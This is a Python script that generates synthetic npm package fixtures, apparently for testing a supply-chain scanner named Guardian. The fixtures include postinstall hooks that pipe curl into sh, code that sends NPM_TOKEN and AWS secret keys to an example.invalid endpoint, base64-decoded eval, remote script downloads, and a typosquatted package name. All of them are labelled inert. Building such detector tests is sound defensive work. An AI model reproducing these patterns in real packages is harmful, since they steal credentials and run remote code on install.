"""Generate inert synthetic source fixtures. Never execute their JavaScript."""
import json
import zipfile
from pathlib import Path
root = Path(__file__).resolve().parents[1] / 'fixtures'
examples = {
 'benign': ('guardian-benign-example', {'build':'tsc'}, 'const port = process.env.PORT || 3000;\nfetch("https://example.invalid/public").then(r => r.json());\nconsole.log(port);\n'),
 'benign-install': ('guardian-build-example', {'postinstall':'node build.js'}, 'const fs = require("node:fs");\nfs.writeFileSync("build.txt", "ready");\n'),
 'postinstall': ('guardian-installer-example', {'postinstall':'curl https://example.invalid/setup.sh | sh'}, 'export const value = 1;\n'),
 'exfiltration': ('guardian-dataflow-example', {}, 'const secret = process.env.NPM_TOKEN;\nconst payload = JSON.stringify({token: secret});\nfetch("https://example.invalid/collect", {method: "POST", body: payload});\n'),
 'obfuscated': ('guardian-encoded-example', {}, 'const text = Buffer.from("Y29uc29sZS5sb2coJ2RlbW8nKQ==", "base64").toString();\neval(text);\n'),
 'remote': ('guardian-download-example', {}, 'const { exec } = require("node:child_process");\nexec("curl https://example.invalid/payload.sh -o /tmp/guardian-synthetic-never-run.sh");\n'),
 'typosquat': ('lodasb', {}, 'export const add = (a, b) => a + b;\n'),
 'correlated': ('guardian-correlated-example', {'postinstall':'node index.js'}, 'const { exec } = require("child_process");\nconst key = process.env.AWS_SECRET_ACCESS_KEY;\nfetch("https://example.invalid/collect", {method:"POST", body:key});\nconst code = Buffer.from("dm9pZCAw", "base64").toString();\neval(code);\nexec("curl https://example.invalid/setup.sh | sh");\n'),
 'remediation-demo': ('guardian-remediation-demo', {'test': 'jest', 'postinstall': 'curl https://example.invalid/setup.sh | sh'}, 'const express = require("express");\nconst app = express();\nconsole.log("Synthetic demo project ready.");\n'),
}
for folder, (name, scripts, source) in examples.items():
    path = root / folder
    path.mkdir(parents=True, exist_ok=True)
    (path / 'package.json').write_text(json.dumps({'name':name,'version':'0.0.0','private':True,'description':'Inert synthetic Guardian test fixture. Never execute.','scripts':scripts}, indent=2)+'\n')
    (path / ('build.js' if folder=='benign-install' else 'index.js')).write_text('// SYNTHETIC TEST DATA — DO NOT EXECUTE\n'+source)
    with zipfile.ZipFile(root / (folder+'.zip'), 'w', zipfile.ZIP_DEFLATED) as archive:
        for file in sorted(path.iterdir()):
            archive.write(file, file.name)
